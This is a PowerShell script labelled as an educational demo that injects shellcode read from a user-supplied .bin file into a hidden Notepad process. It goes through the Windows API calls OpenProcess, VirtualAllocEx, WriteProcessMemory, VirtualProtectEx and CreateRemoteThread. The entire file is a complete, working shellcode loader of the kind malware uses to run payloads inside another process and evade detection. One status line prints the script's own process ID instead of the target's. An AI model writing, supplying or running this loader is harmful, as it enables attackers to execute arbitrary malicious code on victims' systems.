# ==============================================================================
# Educational Demo: Process Injection reading Payload from a .bin File
# Usage: .\inject.ps1 -BinPath "C:\path\to\payload.bin"
# ==============================================================================
param (
    [Parameter(Mandatory=$true, HelpMessage="Path to the raw binary shellcode file")]
    [string]$BinPath
)

# Check if the file exists before proceeding
if (-not (Test-Path -Path $BinPath)) {
    Write-Error "Error: The file '$BinPath' could not be found."
    exit
}

# 1. Define and load the required Windows API signatures via C#
$Kernel32Definitions = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type -TypeDefinition $Kernel32Definitions

# --- CONSTANTS ---
$PROCESS_ALL_ACCESS = 0x001F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20

# 2. Read the raw bytes from the specified .bin file
Write-Host "[*] Reading shellcode from: $BinPath" -ForegroundColor Cyan
[byte[]]$Shellcode = [System.IO.File]::ReadAllBytes($BinPath)
Write-Host "[+] Loaded $($Shellcode.Length) bytes of shellcode." -ForegroundColor Green

# 3. Launch target process (Notepad)
Write-Host "[*] Launching target process (notepad.exe)..." -ForegroundColor Cyan
$TargetProcess = Start-Process notepad.exe -WindowStyle Hidden -PassThru
$TargetPID  = $TargetProcess.Id
Write-Host "[+] Target PID: $PID" -ForegroundColor Green

# Step 1: Open Process
Write-Host "[*] Opening target process..." -ForegroundColor Cyan
$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $TargetPID)
if ($hProcess -eq [IntPtr]::Zero) { 
    Write-Error "Failed to open process."; exit 
}

# Step 2: Allocate Memory as Read/Write (RW)
Write-Host "[*] Allocating RW memory via VirtualAllocEx..." -ForegroundColor Cyan
$RemoteMemory = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$Shellcode.Length, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
if ($RemoteMemory -eq [IntPtr]::Zero) { 
    Write-Error "Failed to allocate memory."; exit 
}

# Step 3: Write Payload to Process
Write-Host "[*] Writing shellcode via WriteProcessMemory..." -ForegroundColor Cyan
$BytesWritten = [IntPtr]::Zero
$Success = [Kernel32]::WriteProcessMemory($hProcess, $RemoteMemory, $Shellcode, [uint32]$Shellcode.Length, [ref]$BytesWritten)

# Step 4: Change Protection to Execute (RW -> RX)
Write-Host "[*] Modifying memory permissions via VirtualProtectEx..." -ForegroundColor Cyan
$OldProtect = 0
$Success = [Kernel32]::VirtualProtectEx($hProcess, $RemoteMemory, [uint32]$Shellcode.Length, $PAGE_EXECUTE_READ, [ref]$OldProtect)

# Step 5: Execute Thread
Write-Host "[*] Triggering execution via CreateRemoteThread..." -ForegroundColor Cyan
$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $RemoteMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero)

if ($hThread -ne [IntPtr]::Zero) {
    Write-Host "[+] Injection completed successfully!" -ForegroundColor Green
} else {
    Write-Error "Failed to create remote thread."
}
